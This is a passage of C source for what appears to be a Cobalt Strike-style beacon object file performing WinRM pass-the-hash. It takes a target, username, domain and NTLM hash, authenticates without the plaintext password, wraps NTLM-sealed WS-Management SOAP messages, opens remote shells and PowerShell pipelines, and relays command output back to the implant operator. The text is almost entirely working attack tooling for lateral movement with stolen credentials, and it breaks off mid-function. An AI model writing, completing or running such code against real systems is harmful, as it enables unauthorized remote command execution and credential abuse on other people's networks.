/* WinRM pass-the-hash BOF. */

#include <windows.h>
#include "beacon.h"
#include "ntlm_auth.h"
#include "ntlm_session.h"
#include "wsman_shell.h"
#include "psrp.h"

DECLSPEC_IMPORT LPVOID  WINAPI WINHTTP$WinHttpOpen(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT LPVOID  WINAPI WINHTTP$WinHttpConnect(LPVOID, LPCWSTR, WORD, DWORD);
DECLSPEC_IMPORT LPVOID  WINAPI WINHTTP$WinHttpOpenRequest(LPVOID, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI WINHTTP$WinHttpAddRequestHeaders(LPVOID, LPCWSTR, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI WINHTTP$WinHttpSendRequest(LPVOID, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
DECLSPEC_IMPORT BOOL    WINAPI WINHTTP$WinHttpReceiveResponse(LPVOID, LPVOID);
DECLSPEC_IMPORT BOOL    WINAPI WINHTTP$WinHttpQueryHeaders(LPVOID, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI WINHTTP$WinHttpQueryDataAvailable(LPVOID, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI WINHTTP$WinHttpReadData(LPVOID, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI WINHTTP$WinHttpSetOption(LPVOID, DWORD, LPVOID, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI WINHTTP$WinHttpSetTimeouts(LPVOID, int, int, int, int);
DECLSPEC_IMPORT BOOL    WINAPI WINHTTP$WinHttpCloseHandle(LPVOID);

DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT int     WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

DECLSPEC_IMPORT BOOL    WINAPI CRYPT32$CryptBinaryToStringA(const BYTE*, DWORD, DWORD, LPSTR, DWORD*);
DECLSPEC_IMPORT BOOL    WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);

DECLSPEC_IMPORT int     __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT size_t  __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT char*   __cdecl MSVCRT$strstr(const char*, const char*);

typedef LPVOID HINTERNET;

#define WINHTTP_ACCESS_TYPE_DEFAULT_PROXY   0
#define WINHTTP_NO_PROXY_NAME               NULL
#define WINHTTP_NO_PROXY_BYPASS             NULL
#define WINHTTP_NO_REFERER                  NULL
#define WINHTTP_DEFAULT_ACCEPT_TYPES        NULL
#define WINHTTP_ADDREQ_FLAG_ADD             0x20000000
#define WINHTTP_ADDREQ_FLAG_REPLACE         0x80000000
#define WINHTTP_QUERY_STATUS_CODE           19
#define WINHTTP_QUERY_FLAG_NUMBER           0x20000000
#define WINHTTP_HEADER_NAME_BY_INDEX        NULL
#define WINHTTP_NO_HEADER_INDEX             NULL
#define WINHTTP_QUERY_RAW_HEADERS_CRLF      22
#define WINHTTP_QUERY_CONTENT_TYPE          1
#define WINHTTP_OPTION_DISABLE_FEATURE      63
#define WINHTTP_OPTION_AUTOLOGON_POLICY     77
#define WINHTTP_AUTOLOGON_SECURITY_LEVEL_HIGH 2
#define WINHTTP_DISABLE_REDIRECTS           0x00000002
#define WINHTTP_DISABLE_AUTHENTICATION      0x00000004

#ifndef CRYPT_STRING_BASE64
#define CRYPT_STRING_BASE64         0x00000001
#endif
#ifndef CRYPT_STRING_NOCRLF
#define CRYPT_STRING_NOCRLF         0x40000000
#endif

#define heap_alloc(sz)  KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (sz))
#define heap_free(p)    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))

#define SOAP_BUF_SIZE   16384
#define RESP_BUF_SIZE   262144
#define RAW_ARGS_MAX    4096

typedef struct {
    WCHAR target[256];
    WCHAR cmd[2048];
    WCHAR username[128];
    WCHAR hash[33];
    WCHAR domain[128];
} RAW_BOF_ARGS;

typedef struct {
    WCHAR *target;
    WCHAR *cmd;
    WCHAR *username;
    WCHAR *hash;
    WCHAR *domain;
    int timeout;
    int port;
} BOF_ARGS;

#define WSMAN_ENCRYPTED_CONTENT_TYPE \
    L"Content-Type: multipart/encrypted;protocol=\"application/HTTP-SPNEGO-session-encrypted\";boundary=\"Encrypted Boundary\"\r\n"
#define WSMAN_SOAP_CONTENT_TYPE \
    L"Content-Type: application/soap+xml;charset=UTF-8\r\n"
#define WSMAN_BOUNDARY "--Encrypted Boundary"
#define WSMAN_OCTET_HEADER "\tContent-Type: application/octet-stream\r\n"

static BOOL b64_encode(BYTE *in, DWORD inLen, char **out, DWORD *outLen)
{
    DWORD sz = 0;
    if (!CRYPT32$CryptBinaryToStringA(in, inLen,
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &sz))
        return FALSE;

    *out = (char *)heap_alloc(sz + 1);
    if (!*out) return FALSE;

    if (!CRYPT32$CryptBinaryToStringA(in, inLen,
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, *out, &sz)) {
        heap_free(*out);
        *out = NULL;
        return FALSE;
    }
    if (outLen) *outLen = sz;
    return TRUE;
}

static BOOL b64_decode(const char *in, DWORD inLen, BYTE **out, DWORD *outLen)
{
    DWORD sz = 0;
    if (!CRYPT32$CryptStringToBinaryA(in, inLen, CRYPT_STRING_BASE64,
            NULL, &sz, NULL, NULL))
        return FALSE;

    *out = (BYTE *)heap_alloc(sz);
    if (!*out) return FALSE;

    if (!CRYPT32$CryptStringToBinaryA(in, inLen, CRYPT_STRING_BASE64,
            *out, &sz, NULL, NULL)) {
        heap_free(*out);
        *out = NULL;
        return FALSE;
    }
    if (outLen) *outLen = sz;
    return TRUE;
}

static BOOL wide_to_utf8(LPCWSTR src, char *dst, int maxLen)
{
    int written;
    if (!src || !dst || maxLen < 1)
        return FALSE;
    written = KERNEL32$WideCharToMultiByte(
        CP_UTF8, WC_ERR_INVALID_CHARS, src, -1, dst, maxLen, NULL, NULL);
    return written > 0;
}

static void narrow_to_wide(const char *src, WCHAR *dst, int maxLen)
{
    int i = 0;
    while (src[i] && i < maxLen - 1) {
        dst[i] = (WCHAR)src[i];
        i++;
    }
    dst[i] = 0;
}

static void secure_zero(void *buffer, SIZE_T length)
{
    volatile BYTE *cursor = (volatile BYTE *)buffer;
    while (cursor && length--)
        *cursor++ = 0;
}

static void secure_heap_free(void *buffer, SIZE_T length)
{
    if (buffer) {
        secure_zero(buffer, length);
        heap_free(buffer);
    }
}

static void generate_uuid(char *out, int outMax)
{
    BYTE r[16];
    ADVAPI32$SystemFunction036(r, 16);

    MSVCRT$_snprintf(out, outMax,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        r[0],r[1],r[2],r[3], r[4],r[5], r[6],r[7],
        r[8],r[9], r[10],r[11],r[12],r[13],r[14],r[15]);
}

static BOOL find_xml_value(const char *xml, const char *startTag,
                           const char *endTag, char *out, int outMax)
{
    const char *s = MSVCRT$strstr(xml, startTag);
    if (!s) return FALSE;
    s += MSVCRT$strlen(startTag);
    const char *e = MSVCRT$strstr(s, endTag);
    if (!e) return FALSE;
    int len = (int)(e - s);
    if (len <= 0 || len >= outMax) return FALSE;
    MSVCRT$memcpy(out, s, len);
    out[len] = 0;
    return TRUE;
}

static BOOL extract_shell_id(const char *xml, char *shellId, int maxLen)
{

    if (find_xml_value(xml,
            "Name=\"ShellId\">", "</w:Selector>",
            shellId, maxLen))
        return TRUE;

    const char *p = MSVCRT$strstr(xml, "ShellId=\"");
    if (!p) return FALSE;
    p += 9;
    const char *e = MSVCRT$strstr(p, "\"");
    if (!e) return FALSE;
    int len = (int)(e - p);
    if (len <= 0 || len >= maxLen) return FALSE;
    MSVCRT$memcpy(shellId, p, len);
    shellId[len] = 0;
    return TRUE;
}

static BOOL extract_command_id(const char *xml, char *cmdId, int maxLen)
{
    return find_xml_value(xml,
        "<rsp:CommandId>", "</rsp:CommandId>",
        cmdId, maxLen);
}

static BOOL check_command_done(const char *xml)
{
    return (MSVCRT$strstr(xml, "CommandState/Done") != NULL);
}

static void extract_stream_output(const char *xml)
{
    const char *pos = xml;
    const char *streamTag;

    while ((streamTag = MSVCRT$strstr(pos, "<rsp:Stream")) != NULL) {

        const char *tagEnd = MSVCRT$strstr(streamTag, ">");
        if (!tagEnd) break;
        tagEnd++;

        BOOL isStderr = FALSE;
        const char *nameAttr = MSVCRT$strstr(streamTag, "Name=\"");
        if (nameAttr && nameAttr < tagEnd) {
            nameAttr += 6;
            if (nameAttr[0] == 's' && nameAttr[1] == 't' &&
                nameAttr[2] == 'd' && nameAttr[3] == 'e')
                isStderr = TRUE;
        }

        const char *closeTag = MSVCRT$strstr(tagEnd, "</rsp:Stream>");
        if (!closeTag) break;

        int b64Len = (int)(closeTag - tagEnd);
        if (b64Len > 0) {
            BYTE *decoded = NULL;
            DWORD decodedLen = 0;
            if (b64_decode(tagEnd, b64Len, &decoded, &decodedLen) &&
                decoded && decodedLen > 0) {

                char *text = (char *)heap_alloc(decodedLen + 1);
                if (text) {
                    MSVCRT$memcpy(text, decoded, decodedLen);
                    text[decodedLen] = 0;
                    if (isStderr)
                        BeaconPrintf(CALLBACK_ERROR, "%s", text);
                    else
                        BeaconPrintf(CALLBACK_OUTPUT, "%s", text);
                    heap_free(text);
                }
                heap_free(decoded);
            }
        }
        pos = closeTag + 13;
    }
}

/* Extract output from PSRP stream data in a Receive response.
 * Each <rsp:Stream Name="stdout"> element contains base64-encoded
 * PSRP fragments.  Decode, parse the PSRP message header, and
 * handle output and state messages.
 * Returns the pipeline state if a PIPELINE_STATE message was seen,
 * or -1 if none appeared. */
static int extract_psrp_stream_output(const char *xml)
{
    const char *pos = xml;
    const char *streamTag;
    int pipelineState = -1;

    while ((streamTag = MSVCRT$strstr(pos, "<rsp:Stream")) != NULL) {
        const char *tagEnd = MSVCRT$strstr(streamTag, ">");
        if (!tagEnd) break;
        tagEnd++;

        const char *closeTag = MSVCRT$strstr(tagEnd, "</rsp:Stream>");
        if (!closeTag) break;

        int b64Len = (int)(closeTag - tagEnd);
        if (b64Len > 0) {
            BYTE *decoded = NULL;
            DWORD decodedLen = 0;
            if (b64_decode(tagEnd, b64Len, &decoded, &decodedLen) &&
                decoded && decodedLen > 0) {
                PSRP_MESSAGE msg;
                if (psrp_parse_fragment(decoded, decodedLen, &msg)) {
                    switch (msg.messageType) {
                    case PSRP_PIPELINE_OUTPUT: {
                        char *text = psrp_extract_text(msg.data);
                        if (text) {
                            BeaconPrintf(CALLBACK_OUTPUT, "%s", text);
                            heap_free(text);
                        }
                        break;
                    }
                    case PSRP_ERROR_RECORD: {
                        char *text = psrp_extract_error_text(msg.data);
                        if (text) {
                            BeaconPrintf(CALLBACK_ERROR, "%s", text);
                            heap_free(text);
                        }
                        break;
                    }
                    case PSRP_PIPELINE_STATE:
                        pipelineState =
                            psrp_extract_pipeline_state(msg.data);
                        break;
                    case PSRP_VERBOSE_RECORD:
                    case PSRP_WARNING_RECORD:
                    case PSRP_DEBUG_RECORD:
                    case PSRP_INFORMATION_RECORD: {
                        char *text = psrp_extract_text(msg.data);
                        if (text) {
                            BeaconPrintf(CALLBACK_OUTPUT, "%s", text);
                            heap_free(text);
                        }
                        break;
                    }
                    default:
                        /* Ignore unknown message types. */
                        break;
                    }
                    psrp_message_free(&msg);
                }
                heap_free(decoded);
            }
        }
        pos = closeTag + 13;
    }
    return pipelineState;
}

static HINTERNET http_post(
    HINTERNET hConnect,
    LPCWSTR   extraHeaders,
    BOOL      encryptedContent,
    char     *body,
    DWORD     bodyLen,
    char    **respBody,
    DWORD    *respBodyLen,
    DWORD    *statusCode)
{
    *respBody    = NULL;
    *respBodyLen = 0;
    *statusCode  = 0;

    LPCWSTR ct = encryptedContent ? WSMAN_ENCRYPTED_CONTENT_TYPE
                                  : WSMAN_SOAP_CONTENT_TYPE;

    HINTERNET hReq = WINHTTP$WinHttpOpenRequest(
        hConnect, L"POST", L"/wsman",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hReq) return NULL;

    /* These options are valid on request handles, not the session handle. */
    DWORD policy = WINHTTP_AUTOLOGON_SECURITY_LEVEL_HIGH;
    DWORD disabled = WINHTTP_DISABLE_AUTHENTICATION |
                     WINHTTP_DISABLE_REDIRECTS;
    if (!WINHTTP$WinHttpSetOption(hReq, WINHTTP_OPTION_AUTOLOGON_POLICY,
            &policy, sizeof(policy)) ||
        !WINHTTP$WinHttpSetOption(hReq, WINHTTP_OPTION_DISABLE_FEATURE,
            &disabled, sizeof(disabled))) {
        BeaconPrintf(CALLBACK_ERROR,
            "Failed to disable WinHTTP automatic authentication: %lu",
            (unsigned long)KERNEL32$GetLastError());
        WINHTTP$WinHttpCloseHandle(hReq);
        return NULL;
    }

    if (!WINHTTP$WinHttpAddRequestHeaders(hReq, ct, (DWORD)-1,
            WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
        WINHTTP$WinHttpCloseHandle(hReq);
        return NULL;
    }

    if (extraHeaders && extraHeaders[0]) {
        if (!WINHTTP$WinHttpAddRequestHeaders(hReq, extraHeaders, (DWORD)-1,
                WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
            WINHTTP$WinHttpCloseHandle(hReq);
            return NULL;
        }
    }

    DWORD totalLen = bodyLen;
    if (!WINHTTP$WinHttpSendRequest(hReq,
            NULL, 0,
            body, bodyLen,
            totalLen,
            0)) {
        WINHTTP$WinHttpCloseHandle(hReq);
        return NULL;
    }

    if (!WINHTTP$WinHttpReceiveResponse(hReq, NULL)) {
        WINHTTP$WinHttpCloseHandle(hReq);
        return NULL;
    }

    DWORD sc = 0, scSize = sizeof(sc);
    WINHTTP$WinHttpQueryHeaders(hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &sc, &scSize,
        WINHTTP_NO_HEADER_INDEX);
    *statusCode = sc;

    char *buf = (char *)heap_alloc(RESP_BUF_SIZE);
    if (!buf) {
        WINHTTP$WinHttpCloseHandle(hReq);
        return NULL;
    }
    DWORD totalRead = 0;
    DWORD avail = 0;
    while (WINHTTP$WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
        if (totalRead + avail >= RESP_BUF_SIZE - 1)
            avail = RESP_BUF_SIZE - 1 - totalRead;
        if (avail == 0) break;

        DWORD nRead = 0;
        WINHTTP$WinHttpReadData(hReq, buf + totalRead, avail, &nRead);
        totalRead += nRead;
        if (nRead == 0) break;
    }
    buf[totalRead] = 0;

    *respBody    = buf;
    *respBodyLen = totalRead;
    return hReq;
}

static WCHAR ascii_lower_w(WCHAR ch)
{
    return (ch >= L'A' && ch <= L'Z') ? ch + (L'a' - L'A') : ch;
}

static BOOL wide_ascii_equals(const WCHAR *value, DWORD valueLen,
                              const char *expected, BOOL ignoreCase)
{
    DWORD i;
    for (i = 0; expected[i]; i++) {
        WCHAR ch;
        if (i >= valueLen || (unsigned int)value[i] > 127)
            return FALSE;
        ch = ignoreCase ? ascii_lower_w(value[i]) : value[i];
        if (ch != (WCHAR)(ignoreCase && expected[i] >= 'A' &&
                         expected[i] <= 'Z' ? expected[i] + ('a' - 'A') :
                         expected[i]))
            return FALSE;
    }
    return i == valueLen;
}

static const WCHAR *skip_wide_space(const WCHAR *value)
{
    while (*value == L' ' || *value == L'\t')
        value++;
    return value;
}

static BOOL wsman_response_is_encrypted(HINTERNET request)
{
    WCHAR contentType[512];
    DWORD contentTypeBytes = sizeof(contentType);
    const WCHAR *cursor, *start;
    BOOL protocolFound = FALSE, boundaryFound = FALSE;

    if (!WINHTTP$WinHttpQueryHeaders(request, WINHTTP_QUERY_CONTENT_TYPE,
            WINHTTP_HEADER_NAME_BY_INDEX, contentType, &contentTypeBytes,
            WINHTTP_NO_HEADER_INDEX))
        return FALSE;
    contentType[511] = 0;
    cursor = skip_wide_space(contentType);
    start = cursor;
    while (*cursor && *cursor != L';' && *cursor != L' ' && *cursor != L'\t')
        cursor++;
    if (!wide_ascii_equals(start, (DWORD)(cursor - start),
                           "multipart/encrypted", TRUE))
        return FALSE;
    cursor = skip_wide_space(cursor);

    while (*cursor) {
        const WCHAR *name, *value;
        DWORD nameLen, valueLen;
        BOOL quoted;
        if (*cursor++ != L';')
            return FALSE;
        cursor = skip_wide_space(cursor);
        name = cursor;
        while ((*cursor >= L'A' && *cursor <= L'Z') ||
               (*cursor >= L'a' && *cursor <= L'z') ||
               *cursor == L'-')
            cursor++;
        nameLen = (DWORD)(cursor - name);
        cursor = skip_wide_space(cursor);
        if (!nameLen || *cursor++ != L'=')
            return FALSE;
        cursor = skip_wide_space(cursor);
        quoted = *cursor == L'"';
        if (quoted) cursor++;
        value = cursor;
        while (*cursor && *cursor != (quoted ? L'"' : L';') &&
               *cursor != L'\r' && *cursor != L'\n' &&
               (quoted || (*cursor != L' ' && *cursor != L'\t')))
            cursor++;
        valueLen = (DWORD)(cursor - value);
        if (!valueLen || (quoted && *cursor++ != L'"'))
            return FALSE;
        cursor = skip_wide_space(cursor);

        if (wide_ascii_equals(name, nameLen, "protocol", TRUE)) {
            if (protocolFound || !wide_ascii_equals(value, valueLen,
                    "application/HTTP-SPNEGO-session-encrypted", TRUE))
                return FALSE;
            protocolFound = TRUE;
        } else if (wide_ascii_equals(name, nameLen, "boundary", TRUE)) {
            if (boundaryFound || !wide_ascii_equals(value, valueLen,
                    "Encrypted Boundary", FALSE))
                return FALSE;
            boundaryFound = TRUE;
        }
    }
    return protocolFound && boundaryFound;
}

static BOOL bytes_at(const BYTE *buffer, DWORD bufferLen, DWORD offset,
                     const char *expected)
{
    DWORD n = (DWORD)MSVCRT$strlen(expected);
    if (offset > bufferLen || n > bufferLen - offset)
        return FALSE;
    for (DWORD i = 0; i < n; i++) {
        if (buffer[offset + i] != (BYTE)expected[i])
            return FALSE;
    }
    return TRUE;
}

/* The NTLM signature length precedes the signature in MS-WSMV. */
static BOOL wsman_wrap_body(NTLM_SESSION_SECURITY *session,
                            const BYTE *soap, DWORD soapLen,
                            BYTE **wrapped, DWORD *wrappedLen)
{
    char prefix[512];
    const char *suffix = WSMAN_BOUNDARY "--\r\n";
    DWORD prefixLen, suffixLen, totalLen;
    BYTE *out;
    BYTE *sealed;
    BYTE signature[16];

    *wrapped = NULL;
    *wrappedLen = 0;
    MSVCRT$_snprintf(prefix, sizeof(prefix) - 1,
        WSMAN_BOUNDARY "\r\n"
        "\tContent-Type: application/HTTP-SPNEGO-session-encrypted\r\n"
        "\tOriginalContent: type=application/soap+xml;charset=UTF-8;Length=%lu\r\n"
        WSMAN_BOUNDARY "\r\n"
        WSMAN_OCTET_HEADER,
        (unsigned long)soapLen);
    prefix[sizeof(prefix) - 1] = 0;
    prefixLen = (DWORD)MSVCRT$strlen(prefix);
    suffixLen = (DWORD)MSVCRT$strlen(suffix);
    if (soapLen > 0xffffffffUL - prefixLen - suffixLen - 20)
        return FALSE;
    totalLen = prefixLen + 4 + 16 + soapLen + suffixLen;
    out = (BYTE *)heap_alloc(totalLen + 1);
    if (!out)
        return FALSE;

    MSVCRT$memcpy(out, prefix, prefixLen);
    *(DWORD *)(out + prefixLen) = 16;
    sealed = out + prefixLen + 4 + 16;
    if (!ntlm_session_wrap(session, soap, soapLen, signature, sealed)) {
        heap_free(out);
        return FALSE;
    }
    MSVCRT$memcpy(out + prefixLen + 4, signature, 16);
    MSVCRT$memcpy(sealed + soapLen, suffix, suffixLen);
    out[totalLen] = 0;
    *wrapped = out;
    *wrappedLen = totalLen;
    return TRUE;
}

static BOOL wsman_unwrap_body(NTLM_SESSION_SECURITY *session,
                              const BYTE *wrapped, DWORD wrappedLen,
                              char **plain, DWORD *plainLen)
{
    static const char metadata[] =
        WSMAN_BOUNDARY "\r\n"
        "\tContent-Type: application/HTTP-SPNEGO-session-encrypted\r\n"
        "\tOriginalContent: type=application/soap+xml;charset=UTF-8;Length=";
    static const char dataHeader[] =
        "\r\n" WSMAN_BOUNDARY "\r\n" WSMAN_OCTET_HEADER;
    static const char ending[] = WSMAN_BOUNDARY "--\r\n";
    DWORD expectedLen = 0;
    DWORD signatureLen;
    DWORD offset, remaining, trailerOffset;
    BYTE *out;
    NTLM_SESSION_SECURITY verifiedSession;

    *plain = NULL;
    *plainLen = 0;
    if (!session || !wrapped || wrappedLen < 20 ||
        !bytes_at(wrapped, wrappedLen, 0, metadata))
        return FALSE;
    offset = (DWORD)MSVCRT$strlen(metadata);
    if (offset >= wrappedLen || wrapped[offset] < '0' ||
        wrapped[offset] > '9')
        return FALSE;
    while (offset < wrappedLen && wrapped[offset] >= '0' &&
           wrapped[offset] <= '9') {
        DWORD digit = (DWORD)(wrapped[offset] - '0');
        if (expectedLen > (0xffffffffUL - digit) / 10)
            return FALSE;
        expectedLen = expectedLen * 10 + digit;
        offset++;
    }
    if (!expectedLen || !bytes_at(wrapped, wrappedLen, offset, dataHeader))
        return FALSE;
    offset += (DWORD)MSVCRT$strlen(dataHeader);
    if (offset > wrappedLen || wrappedLen - offset < 20)
        return FALSE;
    signatureLen = (DWORD)wrapped[offset] |
                   ((DWORD)wrapped[offset + 1] << 8) |
                   ((DWORD)wrapped[offset + 2] << 16) |
                   ((DWORD)wrapped[offset + 3] << 24);
    if (signatureLen != 16)
        return FALSE;
    offset += 4 + signatureLen;
    remaining = wrappedLen - offset;
    if (expectedLen > remaining)
        return FALSE;
    remaining -= expectedLen;
    trailerOffset = offset + expectedLen;
    if (remaining == (DWORD)MSVCRT$strlen(ending) + 2 &&
        bytes_at(wrapped, wrappedLen, trailerOffset, "\r\n")) {
        trailerOffset += 2;
        remaining -= 2;
    }
    if (remaining != (DWORD)MSVCRT$strlen(ending) ||
        !bytes_at(wrapped, wrappedLen, trailerOffset, ending))
        return FALSE;

    out = (BYTE *)heap_alloc(expectedLen + 1);
    if (!out)
        return FALSE;
    verifiedSession = *session;
    if (!ntlm_session_unwrap(&verifiedSession, wrapped + offset - signatureLen,
            wrapped + offset, expectedLen, out)) {
        secure_zero(&verifiedSession, sizeof(verifiedSession));
        secure_heap_free(out, expectedLen + 1);
        return FALSE;
    }
    *session = verifiedSession;
    secure_zero(&verifiedSession, sizeof(verifiedSession));
    out[expectedLen] = 0;
    *plain = (char *)out;
    *plainLen = expectedLen;
    return TRUE;
}

/* Verify protected faults before showing their SOAP body. */
static HINTERNET wsman_post(
    HINTERNET hConnect,
    LPCWSTR extraHeaders,
    NTLM_SESSION_SECURITY *session,
    char *soap,
    DWORD soapLen,
    char **respBody,
    DWORD *respBodyLen,
    DWORD *statusCode)
{
    BYTE *wrapped = NULL;
    DWORD wrappedLen = 0;
    HINTERNET request;

    if (!wsman_wrap_body(session, (const BYTE *)soap, soapLen,
                         &wrapped, &wrappedLen)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to protect WSMan request");
        return NULL;
    }
    request = http_post(hConnect, extraHeaders, TRUE,
        (char *)wrapped, wrappedLen, respBody, respBodyLen, statusCode);
    heap_free(wrapped);

    if (request) {
        BOOL encrypted = wsman_response_is_encrypted(request);
        BOOL encryptedBody = *respBodyLen &&
            bytes_at((const BYTE *)*respBody, *respBodyLen, 0,
                     WSMAN_BOUNDARY);
        char *decrypted = NULL;
        DWORD decryptedLen = 0;
        if (*statusCode == 200 || encrypted || encryptedBody) {
            if (!encrypted || !*respBodyLen ||
                !wsman_unwrap_body(session, (const BYTE *)*respBody,
                                   *respBodyLen, &decrypted, &decryptedLen)) {
                BeaconPrintf(CALLBACK_ERROR,
                    "WinRM response failed encrypted MIME or NTLM signature validation");
                heap_free(*respBody);
                *respBody = NULL;
                *respBodyLen = 0;
                WINHTTP$WinHttpCloseHandle(request);
                return NULL;
            }
            heap_free(*respBody);
            *respBody = decrypted;
            *respBodyLen = decryptedLen;
        }
    }
    return request;
}

static void print_http_fault(const char *stage, DWORD status,
                             char *body, DWORD bodyLen)
{
    DWORD shown;
    char saved;

    BeaconPrintf(CALLBACK_ERROR, "%s returned HTTP %lu", stage, (unsigned long)status);
    if (!body || bodyLen == 0)
        return;

    shown = bodyLen > 2048 ? 2048 : bodyLen;
    saved = body[shown];
    body[shown] = 0;
    BeaconPrintf(CALLBACK_ERROR, "%s response body (%lu%s bytes): %s",
        stage, (unsigned long)shown, bodyLen > shown ? "+" : "", body);
    body[shown] = saved;
}

/* Parse a verified SOAP body for a structured fault.  Match the subcode
 * by namespace URI and local name -- never by XML prefix or unverified
 * text search.  The XML must have been decrypted and signature-checked
 * by wsman_unwrap_body before reaching this function. */
static BOOL wsman_parse_fault(const char *xml, WSMAN_FAULT *fault)
{
    const char *faultNode, *p, *end;
    char fullSubcode[384];

    if (!xml || !fault) return FALSE;
    MSVCRT$memset(fault, 0, sizeof(*fault));
    fault->kind = WSMAN_FAULT_UNKNOWN;

    /* Locate Fault element regardless of namespace prefix. */
    faultNode = MSVCRT$strstr(xml, ":Fault");
    if (!faultNode) faultNode = MSVCRT$strstr(xml, "<Fault");
    if (!faultNode) return FALSE;

    /* Code > Value */
    if (!find_xml_value(xml, "<env:Value>", "</env:Value>",
                        fault->code, sizeof(fault->code)))
        find_xml_value(xml, "<s:Value>", "</s:Value>",
                       fault->code, sizeof(fault->code));

    /* Subcode > Value */
    fullSubcode[0] = 0;
    if (!find_xml_value(xml, "<env:Subcode>", "</env:Subcode>",
                        fullSubcode, sizeof(fullSubcode)))
        find_xml_value(xml, "<s:Subcode>", "</s:Subcode>",
                       fullSubcode, sizeof(fullSubcode));

    if (fullSubcode[0]) {
        char subcodeValue[256];
        subcodeValue[0] = 0;
        if (find_xml_value(fullSubcode, "<env:Value>", "</env:Value>",
                           subcodeValue, sizeof(subcodeValue)) ||
            find_xml_value(fullSubcode, "<s:Value>", "</s:Value>",
                           subcodeValue, sizeof(subcodeValue))) {

            /* Split "prefix:LocalName". */
            p = subcodeValue;
            end = p;
            while (*end && *end != ':') end++;
            if (*end == ':') {
                int prefixLen = (int)(end - p);
                end++;
                MSVCRT$_snprintf(fault->subcodeName,
                    sizeof(fault->subcodeName) - 1, "%s", end);

                /* Resolve the prefix namespace from the envelope. */
                {
                    char nsSearch[128];
                    int nsOff;
                    MSVCRT$_snprintf(nsSearch, sizeof(nsSearch) - 1, "xmlns:");
                    nsOff = (int)MSVCRT$strlen(nsSearch);
                    if (prefixLen < (int)sizeof(nsSearch) - nsOff - 3) {
                        MSVCRT$memcpy(nsSearch + nsOff, p, prefixLen);
                        nsSearch[nsOff + prefixLen] = '=';
                        nsSearch[nsOff + prefixLen + 1] = '"';
                        nsSearch[nsOff + prefixLen + 2] = 0;
                        {
                            const char *nsStart = MSVCRT$strstr(xml, nsSearch);
                            if (nsStart) {
                                const char *nsEnd;
                                int nsLen;
                                nsStart += MSVCRT$strlen(nsSearch);
                                nsEnd = MSVCRT$strstr(nsStart, "\"");
                                if (nsEnd) {
                                    nsLen = (int)(nsEnd - nsStart);
                                    if (nsLen > 0 &&
                                        nsLen < (int)sizeof(fault->subcodeNs)) {
                                        MSVCRT$memcpy(fault->subcodeNs,
                                            nsStart, nsLen);
                                        fault->subcodeNs[nsLen] = 0;
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                MSVCRT$_snprintf(fault->subcodeName,
                    sizeof(fault->subcodeName) - 1, "%s", subcodeValue);
            }
        }
    }

    /* Reason > Text (may have attributes on the element). */
    if (!find_xml_value(xml, "<env:Text", "</env:Text>",
                        fault->reason, sizeof(fault->reason)))
        find_xml_value(xml, "<s:Text", "</s:Text>",
                       fault->reason, sizeof(fault->reason));
    if (fault->reason[0]) {
        p = MSVCRT$strstr(fault->reason, ">");
        if (p) {
            int len;
            p++;
            len = (int)MSVCRT$strlen(p);
            MSVCRT$memcpy(fault->reason, p, len + 1);
        }
    }

    /* Classify known subcodes by namespace + local name. */
    if (fault->subcodeName[0]) {
        BOOL isWsmanNs =
            (MSVCRT$strstr(fault->subcodeNs,
                "schemas.dmtf.org/wbem/wsman") != NULL) ||
            (MSVCRT$strstr(fault->subcodeNs,
                "schemas.microsoft.com/wbem/wsman") != NULL);
        if (isWsmanNs) {
            const char *name = fault->subcodeName;
            if ((name[0] == 'A' || name[0] == 'a') &&
                MSVCRT$strstr(name, "ccessDenied"))
                fault->kind = WSMAN_FAULT_ACCESS_DENIED;
        }
    }

    return TRUE;
}

/* Return TRUE only for a verified AccessDenied SOAP fault. */
static BOOL wsman_is_access_denied(const char *verifiedXml)
{
    WSMAN_FAULT fault;
    if (!wsman_parse_fault(verifiedXml, &fault))
        return FALSE;
    return fault.kind == WSMAN_FAULT_ACCESS_DENIED;
}

static BOOL extract_type2_from_headers(HINTERNET hReq, BYTE **type2, DWORD *type2Len)
{

    DWORD hdrSize = 0;
    WINHTTP$WinHttpQueryHeaders(hReq,
        WINHTTP_QUERY_RAW_HEADERS_CRLF,
